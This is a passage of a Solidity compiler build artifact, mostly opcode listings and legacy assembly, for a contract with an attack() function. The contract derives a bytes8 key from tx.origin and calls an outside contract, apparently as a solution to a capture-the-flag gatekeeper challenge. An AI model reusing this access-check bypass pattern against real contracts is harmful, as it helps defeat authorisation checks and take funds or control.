SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x22A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x23E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x254 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 ORIGIN PUSH2 0xFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MSIZE 0x26 0xE8 JUMPDEST LOG2 CALLER DUP8 SWAP7 0xA7 PUSH25 0xE80DB5F7802C6E5A45655706C4A657B5CC8AF121873964736F PUSH13 0x634300060C0033000000000000 ",
							"sourceMap": "111:741:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;304:97;;;:::i;:::-;;533:116;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;409;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;781:68;;;:::i;:::-;;657:116;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;304:97;386:6;;;;;;;;;;;373:9;366:26;359:34;;344:12;;:49;;;;;;;;;;;;;;;;;;304:97::o;533:116::-;568:4;628:12;;;;;;;;;;;621:20;;591:50;;605:12;;;;;;;;;;;598:20;;591:50;;;;584:57;;533:116;:::o;409:::-;444:4;504:12;;;;;;;;;;;497:20;;467:50;;481:12;;;;;;;;;;;474:20;;467:50;;;;460:57;;409:116;:::o;781:68::-;817:4;;;;;;;;;;:10;;;828:12;;;;;;;;;;;817:24;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;781:68::o;657:116::-;692:4;755:9;716:49;;730:12;;;;;;;;;;;723:20;;716:49;;;709:56;;657:116;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "141600",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"attack()": "infinite",
								"c1()": "1946",
								"c2()": "1924",
								"c3()": "1144",
								"getAddress()": "21886"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 111,
									"end": 852,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 111,
									"end": 852,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 111,
									"end": 852,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 174,
									"end": 192,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFF0000FFFF"
								},
								{
									"begin": 158,
									"end": 192,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 158,
									"end": 192,
									"name": "PUSH",
									"source": 0,
									"value": "14"
								},
								{
									"begin": 158,
									"end": 192,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 158,
									"end": 192,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFF"
								},
								{
									"begin": 158,
									"end": 192,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFF"
								},
								{
									"begin": 158,
									"end": 192,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 158,
									"end": 192,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 227,
									"end": 296,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 227,
									"end": 296,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 227,
									"end": 296,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 227,
									"end": 296,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 227,
									"end": 296,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 227,
									"end": 296,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "LT",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 227,
									"end": 296,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 227,
									"end": 296,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 227,
									"end": 296,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 227,
									"end": 296,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 283,
									"end": 287,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 271,
									"end": 275,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 271,
									"end": 275,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 271,
									"end": 288,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 271,
									"end": 288,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 271,
									"end": 288,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 271,
									"end": 288,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 227,
									"end": 296,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 111,
									"end": 852,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 111,
									"end": 852,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 111,
									"end": 852,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 111,
									"end": 852,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 111,
									"end": 852,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 111,
									"end": 852,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 111,
									"end": 852,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212205926e85ba2338796a778e80db5f7802c6e5a45655706c4a657b5cc8af121873964736f6c634300060c0033",
									".code": [
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "38CC4831"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "48E257CB"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "5F57697C"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "9E5FAAFC"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "F2C07BE5"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 111,
											"end": 852,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 111,
											"end": 852,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 304,
											"end": 401,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 304,
											"end": 401,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 304,
											"end": 401,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 304,
											"end": 401,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 304,
											"end": 401,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 304,
											"end": 401,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 304,
											"end": 401,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 304,
											"end": 401,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 533,
											"end": 649,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 533,
											"end": 649,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 533,
											"end": 649,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 533,
											"end": 649,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 533,
											"end": 649,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 533,
											"end": 649,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 533,
											"end": 649,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 533,
											"end": 649,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 409,
											"end": 525,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 409,
											"end": 525,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 409,
											"end": 525,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 409,
											"end": 525,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 409,
											"end": 525,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 409,
											"end": 525,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 525,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 409,
											"end": 525,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 781,
											"end": 849,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 781,
											"end": 849,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 781,
											"end": 849,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 781,
											"end": 849,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 781,
											"end": 849,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 781,
											"end": 849,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 781,
											"end": 849,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 781,
											"end": 849,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 657,
											"end": 773,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 657,
											"end": 773,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 657,
											"end": 773,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 657,
											"end": 773,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 657,
											"end": 773,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 657,
											"end": 773,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 657,
											"end": 773,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 657,
											"end": 773,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 304,
											"end": 401,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 304,
											"end": 401,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 386,
											"end": 392,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 386,
											"end": 392,
											"name": "PUSH",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 386,
											"end": 392,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 392,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 386,
											"end": 392,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 392,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 386,
											"end": 392,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 392,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 392,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 386,
											"end": 392,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 386,
											"end": 392,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 373,
											"end": 382,
											"name": "ORIGIN",
											"source": 0
										},
										{
											"begin": 366,
											"end": 392,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 359,
											"end": 393,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 359,
											"end": 393,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 344,
											"end": 356,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 344,
											"end": 356,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 344,
											"end": 393,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 344,
											"end": 393,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 344,
											"end": 393,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 344,
											"end": 393,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 344,
											"end": 393,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 304,
											"end": 401,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 533,
											"end": 649,
